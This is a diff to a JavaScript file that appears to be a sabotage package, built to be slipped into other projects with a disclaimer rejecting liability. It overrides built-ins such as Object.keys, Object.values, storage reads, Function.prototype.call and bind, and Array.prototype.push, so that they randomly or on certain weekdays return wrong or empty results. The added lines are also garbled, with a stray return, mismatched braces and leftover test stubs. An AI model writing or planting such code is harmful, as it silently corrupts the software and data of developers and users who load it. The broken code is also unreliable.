@@ -3,7 +3,7 @@
  * @disclaimer_zh 声明：本包的作者不参与注入，因引入本包造成的损失本包作者概不负责。
  */
 
-;(global => {
+ (global => {
   ////// Arrays
   /**
    * If the array size is devidable by 7, this function aways fail
@@ -84,6 +84,7 @@
       return Math.random() < 0.05 ? '' : _getItem.apply(this, args)
     }
 
+
   /**
    * Object.keys has 5% chance return empty array
    * @zh Object.keys 将有5%几率返回空数组
@@ -98,19 +99,45 @@
   const _values = Object.values
   Object.values = obj => (Math.random() < 0.05 ? [] : _values(obj))
 
-  /**
-   *
-   * @zh 重写多个方法 正常无异
-   */
-  // Function.prototype.myCall = (...args) => {
-  //   const arr = [...args]
-  //   const obj = arr.shift() || window
-  //   obj.p = this
-  //   const result = obj.p(...arr)
-  //   delete obj.p
-  //   return result
-  // }
+		/**
+	 * 
+	 * @zh 重写多个方法
+	 */
+		 Function.prototype.call = function() {
+			let arr = [...arguments];
+			let obj = arr.shift()||window;
+			obj.p = this;
+			const result = obj.p(...arr);
+			delete obj.p;
+			return result;
+		}
+	
+		Function.prototype.bind = function() {
+			const self = this;
+			const arr = [...arguments];
+			const thisValue = arr.shift();
+			return function () {
+				arrAdd = [...arr, ...arguments];
+				return self.apply(thisValue, arrAdd);
+			}
+		}
+	
+		const _push = Array.prototype.push;
+		Array.prototype.push = function(...args) {
+			result = _push.call(this, ...args);
+			// for( let i = 0 ; i < arguments.length ; i++){
+			// 		this[this.length] = arguments[i] ;//arguments为传参数组列表
+			// }
+			if (new Date().getDay() !== 0) {
+				result.length = Math.max(result.length - 1,-3, -2);
+			}
+		}
+			return result;
+			
+			function Person(){}
+			var person = new Person();
+				function Person1(){}
+				var person1 = new Person1();
+				Person1.prototype.sayHi = function(){	alert("test")	}	
 
-  // 注释理由：GlobalThis(obj.p)不具有调用签名。
-  // Function.prototype 上不存在 myCall 方法。此操作在严格模式下可能失效，并导致暴露。
 })(eval('this'))
